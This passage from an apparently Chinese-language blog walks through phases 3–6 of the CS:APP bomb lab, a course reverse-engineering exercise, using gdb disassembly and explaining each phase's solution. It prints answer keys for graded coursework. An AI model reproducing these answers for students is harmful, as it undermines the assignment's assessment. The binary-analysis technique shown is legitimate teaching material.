class="number">9</span>&gt;:<span class="keyword">lea</span>    <span class="number">0x8</span>(%rsp),%rdx</div><div class="line">   <span class="number">0x0000000000400f51</span> &lt;+<span class="number">14</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x4025cf,%esi</div><div class="line">   <span class="number">0x0000000000400f56</span> &lt;+<span class="number">19</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</div><div class="line">   <span class="number">0x0000000000400f5b</span> &lt;+<span class="number">24</span>&gt;:callq  <span class="number">0x400bf0</span> &lt;__isoc99_sscanf@plt&gt;</div><div class="line">   <span class="number">0x0000000000400f60</span> &lt;+<span class="number">29</span>&gt;:<span class="keyword">cmp</span>    <span class="number">$0</span>x1,%eax</div><div class="line">   <span class="number">0x0000000000400f63</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">jg</span>     <span class="number">0x400f6a</span> &lt;phase_3+<span class="number">39</span>&gt;</div><div class="line">   <span class="number">0x0000000000400f65</span> &lt;+<span class="number">34</span>&gt;:callq  <span class="number">0x40143a</span> &lt;explode_bomb&gt;</div><div class="line">   <span class="number">0x0000000000400f6a</span> &lt;+<span class="number">39</span>&gt;:cmpl   <span class="number">$0</span>x7,<span class="number">0x8</span>(%rsp)</div><div class="line">   <span class="number">0x0000000000400f6f</span> &lt;+<span class="number">44</span>&gt;:<span class="keyword">ja</span>     <span class="number">0x400fad</span> &lt;phase_3+<span class="number">106</span>&gt;</div><div class="line">   <span class="number">0x0000000000400f71</span> &lt;+<span class="number">46</span>&gt;:<span class="keyword">mov</span>    <span class="number">0x8</span>(%rsp),%eax</div><div class="line">   <span class="number">0x0000000000400f75</span> &lt;+<span class="number">50</span>&gt;:jmpq   *<span class="number">0x402470</span>(,%rax,<span class="number">8</span>)</div><div class="line">   <span class="number">0x0000000000400f7c</span> &lt;+<span class="number">57</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>xcf,%eax</div><div class="line">   <span class="number">0x0000000000400f81</span> &lt;+<span class="number">62</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</div><div class="line">   <span class="number">0x0000000000400f83</span> &lt;+<span class="number">64</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x2c3,%eax</div><div class="line">   <span class="number">0x0000000000400f88</span> &lt;+<span class="number">69</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</div><div class="line">   <span class="number">0x0000000000400f8a</span> &lt;+<span class="number">71</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x100,%eax</div><div class="line">   <span class="number">0x0000000000400f8f</span> &lt;+<span class="number">76</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</div><div class="line">   <span class="number">0x0000000000400f91</span> &lt;+<span class="number">78</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x185,%eax</div><div class="line">   <span class="number">0x0000000000400f96</span> &lt;+<span class="number">83</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</div><div class="line">   <span class="number">0x0000000000400f98</span> &lt;+<span class="number">85</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>xce,%eax</div><div class="line">   <span class="number">0x0000000000400f9d</span> &lt;+<span class="number">90</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</div><div class="line">   <span class="number">0x0000000000400f9f</span> &lt;+<span class="number">92</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x2aa,%eax</div><div class="line">   <span class="number">0x0000000000400fa4</span> &lt;+<span class="number">97</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</div><div class="line">   <span class="number">0x0000000000400fa6</span> &lt;+<span class="number">99</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x147,%eax</div><div class="line">   <span class="number">0x0000000000400fab</span> &lt;+<span class="number">104</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</div><div class="line">   <span class="number">0x0000000000400fad</span> &lt;+<span class="number">106</span>&gt;:callq  <span class="number">0x40143a</span> &lt;explode_bomb&gt;</div><div class="line">   <span class="number">0x0000000000400fb2</span> &lt;+<span class="number">111</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</div><div class="line">   <span class="number">0x0000000000400fb7</span> &lt;+<span class="number">116</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</div><div class="line">   <span class="number">0x0000000000400fb9</span> &lt;+<span class="number">118</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x137,%eax</div><div class="line">   <span class="number">0x0000000000400fbe</span> &lt;+<span class="number">123</span>&gt;:<span class="keyword">cmp</span>    <span class="number">0xc</span>(%rsp),%eax</div><div class="line">   <span class="number">0x0000000000400fc2</span> &lt;+<span class="number">127</span>&gt;:<span class="keyword">je</span>     <span class="number">0x400fc9</span> &lt;phase_3+<span class="number">134</span>&gt;</div><div class="line">   <span class="number">0x0000000000400fc4</span> &lt;+<span class="number">129</span>&gt;:callq  <span class="number">0x40143a</span> &lt;explode_bomb&gt;</div><div class="line">   <span class="number">0x0000000000400fc9</span> &lt;+<span class="number">134</span>&gt;:<span class="keyword">add</span>    <span class="number">$0</span>x18,%rsp</div><div class="line">   <span class="number">0x0000000000400fcd</span> &lt;+<span class="number">138</span>&gt;:retq   </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure><p>再看&lt;+39&gt;行，将第一个数字和7比较，如果大于7就explode_bomb。否则就根据第一个数进行跳转，查看0x402470及之后对应的内容。 其实就是一个跳转表，根据0~7跳到不同的分支下，每个分支下决定了第二个数字。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">(gdb) x/8w <span class="number">0x402470</span></div><div class="line"><span class="number">0x402470</span>:U<span class="string">"\x400f7c"</span></div><div class="line"><span class="number">0x402478</span>:U<span class="string">"\x400fb9"</span></div><div class="line"><span class="number">0x402480</span>:U<span class="string">"\x400f83"</span></div><div class="line"><span class="number">0x402488</span>:U<span class="string">"\x400f8a"</span></div><div class="line"><span class="number">0x402490</span>:U<span class="string">"\x400f91"</span></div><div class="line"><span class="number">0x402498</span>:U<span class="string">"\x400f98"</span></div><div class="line"><span class="number">0x4024a0</span>:U<span class="string">"\x400f9f"</span></div><div class="line"><span class="number">0x4024a8</span>:U<span class="string">"\x400fa6"</span></div></pre></td></tr></table></figure><p>所以对应的答案为：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">0 </span><span class="number">0</span>xcf -&gt; <span class="number">0</span> <span class="number">207</span></div><div class="line"><span class="symbol">1 </span><span class="number">0</span>x137-&gt; <span class="number">1</span> <span class="number">311</span></div><div class="line"><span class="symbol">2 </span><span class="number">0</span>x2c3 -&gt; <span class="number">2</span> <span class="number">707</span></div><div class="line"><span class="symbol">3 </span><span class="number">0</span>x100 -&gt; <span class="number">3</span> <span class="number">256</span></div><div class="line"><span class="symbol">4 </span><span class="number">0</span>x185 -&gt; <span class="number">4</span> <span class="number">389</span></div><div class="line"><span class="symbol">5 </span><span class="number">0</span>xce  -&gt; <span class="number">5</span> <span class="number">206</span></div><div class="line"><span class="symbol">6 </span><span class="number">0</span>x2aa -&gt; <span class="number">6</span> <span class="number">682</span></div><div class="line"><span class="symbol">7 </span><span class="number">0</span>x147 -&gt; <span class="number">7</span> <span class="number">327</span></div></pre></td></tr></table></figure><h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h2><p>同样在phase_4中，读入两个数字，如果第一个数字小于$0xe，则调用func4。函数结束之后，判断第二参数是否为0</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">(gdb) disas phase_4</div><div class="line">Dump of assembler code <span class="keyword">for</span> function phase_4:</div><div class="line">   <span class="number">0</span>x000000000040100c <span class="variable">&lt;+0&gt;</span>:sub    <span class="variable">$0x18</span>,%rsp</div><div class="line">   <span class="number">0</span>x0000000000401010 <span class="variable">&lt;+4&gt;</span>:lea    <span class="number">0</span>xc(%rsp),%rcx</div><div class="line">   <span class="number">0</span>x0000000000401015 <span class="variable">&lt;+9&gt;</span>:lea    <span class="number">0</span>x8(%rsp),%rdx</div><div class="line">   <span class="number">0</span>x000000000040101a <span class="variable">&lt;+14&gt;</span>:mov    <span class="variable">$0x4025cf</span>,%esi</div><div class="line">   <span class="number">0</span>x000000000040101f <span class="variable">&lt;+19&gt;</span>:mov    <span class="variable">$0x0</span>,%eax</div><div class="line">   <span class="number">0</span>x0000000000401024 <span class="variable">&lt;+24&gt;</span>:callq  <span class="number">0</span>x400bf0 <span class="variable">&lt;__isoc99_sscanf@plt&gt;</span></div><div class="line">   <span class="number">0</span>x0000000000401029 <span class="variable">&lt;+29&gt;</span>:cmp    <span class="variable">$0x2</span>,%eax</div><div class="line">   <span class="number">0</span>x000000000040102c <span class="variable">&lt;+32&gt;</span>:jne    <span class="number">0</span>x401035 <span class="variable">&lt;phase_4+41&gt;</span></div><div class="line">   <span class="number">0</span>x000000000040102e <span class="variable">&lt;+34&gt;</span>:cmpl   <span class="variable">$0xe</span>,<span class="number">0</span>x8(%rsp)</div><div class="line">   <span class="number">0</span>x0000000000401033 <span class="variable">&lt;+39&gt;</span>:jbe    <span class="number">0</span>x40103a <span class="variable">&lt;phase_4+46&gt;</span></div><div class="line">   <span class="number">0</span>x0000000000401035 <span class="variable">&lt;+41&gt;</span>:callq  <span class="number">0</span>x40143a <span class="variable">&lt;explode_bomb&gt;</span></div><div class="line">   <span class="number">0</span>x000000000040103a <span class="variable">&lt;+46&gt;</span>:mov    <span class="variable">$0xe</span>,%edx</div><div class="line">   <span class="number">0</span>x000000000040103f <span class="variable">&lt;+51&gt;</span>:mov    <span class="variable">$0x0</span>,%esi</div><div class="line">   <span class="number">0</span>x0000000000401044 <span class="variable">&lt;+56&gt;</span>:mov    <span class="number">0</span>x8(%rsp),%edi</div><div class="line">   <span class="number">0</span>x0000000000401048 <span class="variable">&lt;+60&gt;</span>:callq  <span class="number">0</span>x400fce <span class="variable">&lt;func4&gt;</span></div><div class="line">   <span class="number">0</span>x000000000040104d <span class="variable">&lt;+65&gt;</span>:test   %eax,%eax</div><div class="line">   <span class="number">0</span>x000000000040104f <span class="variable">&lt;+67&gt;</span>:jne    <span class="number">0</span>x401058 <span class="variable">&lt;phase_4+76&gt;</span></div><div class="line">   <span class="number">0</span>x0000000000401051 <span class="variable">&lt;+69&gt;</span>:cmpl   <span class="variable">$0x0</span>,<span class="number">0</span>xc(%rsp)</div><div class="line">   <span class="number">0</span>x0000000000401056 <span class="variable">&lt;+74&gt;</span>:je     <span class="number">0</span>x40105d <span class="variable">&lt;phase_4+81&gt;</span></div><div class="line">   <span class="number">0</span>x0000000000401058 <span class="variable">&lt;+76&gt;</span>:callq  <span class="number">0</span>x40143a <span class="variable">&lt;explode_bomb&gt;</span></div><div class="line">   <span class="number">0</span>x000000000040105d <span class="variable">&lt;+81&gt;</span>:add    <span class="variable">$0x18</span>,%rsp</div><div class="line">   <span class="number">0</span>x0000000000401061 <span class="variable">&lt;+85&gt;</span>:retq   </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure><p>反汇编func4,根据汇编逻辑可以发现如果第一个参数为7，正好符合逻辑。所以答案为 7 0</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code for function func4:</div><div class="line">   <span class="number">0x0000000000400fce</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">sub</span>    <span class="number">$0</span>x8,%rsp</div><div class="line">   <span class="number">0x0000000000400fd2</span> &lt;+<span class="number">4</span>&gt;:<span class="keyword">mov</span>    %edx,%eax</div><div class="line">   <span class="number">0x0000000000400fd4</span> &lt;+<span class="number">6</span>&gt;:<span class="keyword">sub</span>    %esi,%eax</div><div class="line">   <span class="number">0x0000000000400fd6</span> &lt;+<span class="number">8</span>&gt;:<span class="keyword">mov</span>    %eax,%ecx</div><div class="line">   <span class="number">0x0000000000400fd8</span> &lt;+<span class="number">10</span>&gt;:<span class="keyword">shr</span>    <span class="number">$0</span>x1f,%ecx</div><div class="line">   <span class="number">0x0000000000400fdb</span> &lt;+<span class="number">13</span>&gt;:<span class="keyword">add</span>    %ecx,%eax</div><div class="line">   <span class="number">0x0000000000400fdd</span> &lt;+<span class="number">15</span>&gt;:<span class="keyword">sar</span>    %eax</div><div class="line">   <span class="number">0x0000000000400fdf</span> &lt;+<span class="number">17</span>&gt;:<span class="keyword">lea</span>    (%rax,%rsi,<span class="number">1</span>),%ecx</div><div class="line">   <span class="number">0x0000000000400fe2</span> &lt;+<span class="number">20</span>&gt;:<span class="keyword">cmp</span>    %edi,%ecx</div><div class="line">   <span class="number">0x0000000000400fe4</span> &lt;+<span class="number">22</span>&gt;:<span class="keyword">jle</span>    <span class="number">0x400ff2</span> &lt;func4+<span class="number">36</span>&gt;</div><div class="line">   <span class="number">0x0000000000400fe6</span> &lt;+<span class="number">24</span>&gt;:<span class="keyword">lea</span>    -<span class="number">0x1</span>(%rcx),%edx</div><div class="line">   <span class="number">0x0000000000400fe9</span> &lt;+<span class="number">27</span>&gt;:callq  <span class="number">0x400fce</span> &lt;func4&gt;</div><div class="line">   <span class="number">0x0000000000400fee</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">add</span>    %eax,%eax</div><div class="line">   <span class="number">0x0000000000400ff0</span> &lt;+<span class="number">34</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x401007</span> &lt;func4+<span class="number">57</span>&gt;</div><div class="line">   <span class="number">0x0000000000400ff2</span> &lt;+<span class="number">36</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</div><div class="line">   <span class="number">0x0000000000400ff7</span> &lt;+<span class="number">41</span>&gt;:<span class="keyword">cmp</span>    %edi,%ecx</div><div class="line">   <span class="number">0x0000000000400ff9</span> &lt;+<span class="number">43</span>&gt;:<span class="keyword">jge</span>    <span class="number">0x401007</span> &lt;func4+<span class="number">57</span>&gt;</div><div class="line">   <span class="number">0x0000000000400ffb</span> &lt;+<span class="number">45</span>&gt;:<span class="keyword">lea</span>    <span class="number">0x1</span>(%rcx),%esi</div><div class="line">   <span class="number">0x0000000000400ffe</span> &lt;+<span class="number">48</span>&gt;:callq  <span class="number">0x400fce</span> &lt;func4&gt;</div><div class="line">   <span class="number">0x0000000000401003</span> &lt;+<span class="number">53</span>&gt;:<span class="keyword">lea</span>    <span class="number">0x1</span>(%rax,%rax,<span class="number">1</span>),%eax</div><div class="line">   <span class="number">0x0000000000401007</span> &lt;+<span class="number">57</span>&gt;:<span class="keyword">add</span>    <span class="number">$0</span>x8,%rsp</div><div class="line">   <span class="number">0x000000000040100b</span> &lt;+<span class="number">61</span>&gt;:retq   </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure><h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><p>phase5先读入长度为6的一个字符串，然后&lt;+41&gt;-&lt;+86&gt;行，将每个读入的字符做 and $0xf运算，得到最低4位。利用最低4位的值从0x4024b0开头的字符串中选择对应的值。</p><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) x/s <span class="number">0x4024b0</span></div><div class="line"><span class="number">0x4024b0</span> &lt;array<span class="number">.3449</span>&gt;:<span class="comment">"maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?"</span></div></pre></td></tr></table></figure><p>而最后将6个字符串变换之后，和”flyers”进行对比，如果相同则答案正确。</p><p>所以这题有多个答案，只需要字符串的最低4位通过转化能够得到”flyers”都行。例如”ionefg”</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">(gdb) disas phase_5</div><div class="line">Dump of assembler code for function phase_5:</div><div class="line">   <span class="number">0x0000000000401062</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">push</span>   %rbx</div><div class="line">   <span class="number">0x0000000000401063</span> &lt;+<span class="number">1</span>&gt;:<span class="keyword">sub</span>    <span class="number">$0</span>x20,%rsp</div><div class="line">   <span class="number">0x0000000000401067</span> &lt;+<span class="number">5</span>&gt;:<span class="keyword">mov</span>    %rdi,%rbx</div><div class="line">   <span class="number">0x000000000040106a</span> &lt;+<span class="number">8</span>&gt;:<span class="keyword">mov</span>    %fs:<span class="number">0x28</span>,%rax</div><div class="line">   <span class="number">0x0000000000401073</span> &lt;+<span class="number">17</span>&gt;:<span class="keyword">mov</span>    %rax,<span class="number">0x18</span>(%rsp)</div><div class="line">   <span class="number">0x0000000000401078</span> &lt;+<span class="number">22</span>&gt;:<span class="keyword">xor</span>    %eax,%eax</div><div class="line">   <span class="number">0x000000000040107a</span> &lt;+<span class="number">24</span>&gt;:callq  <span class="number">0x40131b</span> &lt;string_length&gt;</div><div class="line">   <span class="number">0x000000000040107f</span> &lt;+<span class="number">29</span>&gt;:<span class="keyword">cmp</span>    <span class="number">$0</span>x6,%eax</div><div class="line">   <span class="number">0x0000000000401082</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4010d2</span> &lt;phase_5+<span class="number">112</span>&gt;</div><div class="line">   <span class="number">0x0000000000401084</span> &lt;+<span class="number">34</span>&gt;:callq  <span class="number">0x40143a</span> &lt;explode_bomb&gt;</div><div class="line">   <span class="number">0x0000000000401089</span> &lt;+<span class="number">39</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x4010d2</span> &lt;phase_5+<span class="number">112</span>&gt;</div><div class="line">   <span class="number">0x000000000040108b</span> &lt;+<span class="number">41</span>&gt;:movzbl (%rbx,%rax,<span class="number">1</span>),%ecx</div><div class="line">   <span class="number">0x000000000040108f</span> &lt;+<span class="number">45</span>&gt;:<span class="keyword">mov</span>    %cl,(%rsp)</div><div class="line">   <span class="number">0x0000000000401092</span> &lt;+<span class="number">48</span>&gt;:<span class="keyword">mov</span>    (%rsp),%rdx</div><div class="line">   <span class="number">0x0000000000401096</span> &lt;+<span class="number">52</span>&gt;:<span class="keyword">and</span>    <span class="number">$0</span>xf,%edx</div><div class="line">   <span class="number">0x0000000000401099</span> &lt;+<span class="number">55</span>&gt;:movzbl <span class="number">0x4024b0</span>(%rdx),%edx</div><div class="line">   <span class="number">0x00000000004010a0</span> &lt;+<span class="number">62</span>&gt;:<span class="keyword">mov</span>    %dl,<span class="number">0x10</span>(%rsp,%rax,<span class="number">1</span>)</div><div class="line">   <span class="number">0x00000000004010a4</span> &lt;+<span class="number">66</span>&gt;:<span class="keyword">add</span>    <span class="number">$0</span>x1,%rax</div><div class="line">   <span class="number">0x00000000004010a8</span> &lt;+<span class="number">70</span>&gt;:<span class="keyword">cmp</span>    <span class="number">$0</span>x6,%rax</div><div class="line">   <span class="number">0x00000000004010ac</span> &lt;+<span class="number">74</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x40108b</span> &lt;phase_5+<span class="number">41</span>&gt;</div><div class="line">   <span class="number">0x00000000004010ae</span> &lt;+<span class="number">76</span>&gt;:movb   <span class="number">$0</span>x0,<span class="number">0x16</span>(%rsp)</div><div class="line">   <span class="number">0x00000000004010b3</span> &lt;+<span class="number">81</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x40245e,%esi</div><div class="line">   <span class="number">0x00000000004010b8</span> &lt;+<span class="number">86</span>&gt;:<span class="keyword">lea</span>    <span class="number">0x10</span>(%rsp),%rdi</div><div class="line">   <span class="number">0x00000000004010bd</span> &lt;+<span class="number">91</span>&gt;:callq  <span class="number">0x401338</span> &lt;strings_not_equal&gt;</div><div class="line">   <span class="number">0x00000000004010c2</span> &lt;+<span class="number">96</span>&gt;:<span class="keyword">test</span>   %eax,%eax</div><div class="line">   <span class="number">0x00000000004010c4</span> &lt;+<span class="number">98</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4010d9</span> &lt;phase_5+<span class="number">119</span>&gt;</div><div class="line">   <span class="number">0x00000000004010c6</span> &lt;+<span class="number">100</span>&gt;:callq  <span class="number">0x40143a</span> &lt;explode_bomb&gt;</div><div class="line">   <span class="number">0x00000000004010cb</span> &lt;+<span class="number">105</span>&gt;:nopl   <span class="number">0x0</span>(%rax,%rax,<span class="number">1</span>)</div><div class="line">   <span class="number">0x00000000004010d0</span> &lt;+<span class="number">110</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x4010d9</span> &lt;phase_5+<span class="number">119</span>&gt;</div><div class="line">   <span class="number">0x00000000004010d2</span> &lt;+<span class="number">112</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</div><div class="line">   <span class="number">0x00000000004010d7</span> &lt;+<span class="number">117</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x40108b</span> &lt;phase_5+<span class="number">41</span>&gt;</div><div class="line">   <span class="number">0x00000000004010d9</span> &lt;+<span class="number">119</span>&gt;:<span class="keyword">mov</span>    <span class="number">0x18</span>(%rsp),%rax</div><div class="line">   <span class="number">0x00000000004010de</span> &lt;+<span class="number">124</span>&gt;:<span class="keyword">xor</span>    %fs:<span class="number">0x28</span>,%rax</div><div class="line">   <span class="number">0x00000000004010e7</span> &lt;+<span class="number">133</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4010ee</span> &lt;phase_5+<span class="number">140</span>&gt;</div><div class="line">   <span class="number">0x00000000004010e9</span> &lt;+<span class="number">135</span>&gt;:callq  <span class="number">0x400b30</span> &lt;__stack_chk_fail@plt&gt;</div><div class="line">   <span class="number">0x00000000004010ee</span> &lt;+<span class="number">140</span>&gt;:<span class="keyword">add</span>    <span class="number">$0</span>x20,%rsp</div><div class="line">   <span class="number">0x00000000004010f2</span> &lt;+<span class="number">144</span>&gt;:<span class="keyword">pop</span>    %rbx</div><div class="line">   <span class="number">0x00000000004010f3</span> &lt;+<span class="number">145</span>&gt;:retq   </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure><h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h2><p>phase_6的代码比较长，可以好几段进行解读。 首先还是从字符串中读入6个数字，然后判断数字范围都在1-6之前，并且每个数字互不相同。</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">(gdb) disas phase_6</div><div class="line">Dump of assembler code <span class="keyword">for</span> function phase_6:</div><div class="line">   <span class="number">0</span>x00000000004010f4 <span class="variable">&lt;+0&gt;</span>:push   %r14</div><div class="line">   <span class="number">0</span>x00000000004010f6 <span class="variable">&lt;+2&gt;</span>:push   %r13</div><div class="line">   <span class="number">0</span>x00000000004010f8 <span class="variable">&lt;+4&gt;</span>:push   %r12</div><div class="line">   <span class="number">0</span>x00000000004010fa <span class="variable">&lt;+6&gt;</span>:push   %rbp</div><div class="line">   <span class="number">0</span>x00000000004010fb <span class="variable">&lt;+7&gt;</span>:push   %rbx</div><div class="line">   <span class="number">0</span>x00000000004010fc <span class="variable">&lt;+8&gt;</span>:sub    <span class="variable">$0x50</span>,%rsp</div><div class="line">   <span class="number">0</span>x0000000000401100 <span class="variable">&lt;+12&gt;</span>:mov    %rsp,%r13</div><div class="line">   <span class="number">0</span>x0000000000401103 <span class="variable">&lt;+15&gt;</span>:mov    %rsp,%rsi</div><div class="line">   <span class="number">0</span>x0000000000401106 <span class="variable">&lt;+18&gt;</span>:callq  <span class="number">0</span>x40145c <span class="variable">&lt;read_six_numbers&gt;</span></div><div class="line">   <span class="number">0</span>x000000000040110b <span class="variable">&lt;+23&gt;</span>:mov    %rsp,%r14</div><div class="line">   <span class="number">0</span>x000000000040110e <span class="variable">&lt;+26&gt;</span>:mov    <span class="variable">$0x0</span>,%r12d</div><div class="line">   <span class="number">0</span>x0000000000401114 <span class="variable">&lt;+32&gt;</span>:mov    %r13,%rbp</div><div class="line">   <span class="number">0</span>x0000000000401117 <span class="variable">&lt;+35&gt;</span>:mov    <span class="number">0</span>x0(%r13),%eax</div><div class="line">   <span class="number">0</span>x000000000040111b <span class="variable">&lt;+39&gt;</span>:sub    <span class="variable">$0x1</span>,%eax</div><div class="line">   <span class="number">0</span>x000000000040111e <span class="variable">&lt;+42&gt;</span>:cmp    <span class="variable">$0x5</span>,%eax</div><div class="line">   <span class="number">0</span>x0000000000401121 <span class="variable">&lt;+45&gt;</span>:jbe    <span class="number">0</span>x401128 <span class="variable">&lt;phase_6+52&gt;</span></div><div class="line">   <span class="number">0</span>x0000000000401123 <span class="variable">&lt;+47&gt;</span>:callq  <span class="number">0</span>x40143a <span class="variable">&lt;explode_bomb&gt;</span></div><div class="line">   <span class="number">0</span>x0000000000401128 <span class="variable">&lt;+52&gt;</span>:add    <span class="variable">$0x1</span>,%r12d</div><div class="line">   <span class="number">0</span>x000000000040112c <span class="variable">&lt;+56&gt;</span>:cmp    <span class="variable">$0x6</span>,%r12d</div><div class="line">   <span class="number">0</span>x0000000000401130 <span class="variable">&lt;+60&gt;</span>:je     <span class="number">0</span>x401153 <span class="variable">&lt;phase_6+95&gt;</span></div><div class="line">   <span class="number">0</span>x0000000000401132 <span class="variable">&lt;+62&gt;</span>:mov    %r12d,%ebx</div><div class="line">   <span class="number">0</span>x0000000000401135 <span class="variable">&lt;+65&gt;</span>:movslq %ebx,%rax</div><div class="line">   <span class="number">0</span>x0000000000401138 <span class="variable">&lt;+68&gt;</span>:mov    (%rsp,%rax,<span class="number">4</span>),%eax</div><div class="line">   <span class="number">0</span>x000000000040113b <span class="variable">&lt;+71&gt;</span>:cmp    %eax,<span class="number">0</span>x0(%rbp)</div><div class="line">   <span class="number">0</span>x000000000040113e <span class="variable">&lt;+74&gt;</span>:jne    <span class="number">0</span>x401145 <span class="variable">&lt;phase_6+81&gt;</span></div><div class="line">   <span class="number">0</span>x0000000000401140 <span class="variable">&lt;+76&gt;</span>:callq  <span class="number">0</span>x40143a <span class="variable">&lt;explode_bomb&gt;</span></div><div class="line">   <span class="number">0</span>x0000000000401145 <span class="variable">&lt;+81&gt;</span>:add    <span class="variable">$0x1</span>,%ebx</div><div class="line">   <span class="number">0</span>x0000000000401148 <span class="variable">&lt;+84&gt;</span>:cmp    <span class="variable">$0x5</span>,%ebx</div><div class="line">   <span class="number">0</span>x000000000040114b <span class="variable">&lt;+87&gt;</span>:jle    <span class="number">0</span>x401135 <span class="variable">&lt;phase_6+65&gt;</span></div><div class="line">   <span class="number">0</span>x000000000040114d <span class="variable">&lt;+89&gt;</span>:add    <span class="variable">$0x4</span>,%r13</div><div class="line">   <span class="number">0</span>x0000000000401151 <span class="variable">&lt;+93&gt;</span>:jmp    <span class="number">0</span>x401114 <span class="variable">&lt;phase_6+32&gt;</span></div></pre></td></tr></table></figure><p>之后将每个数字$x_i$转化为$7-x_i$。</p><figure class="highlight 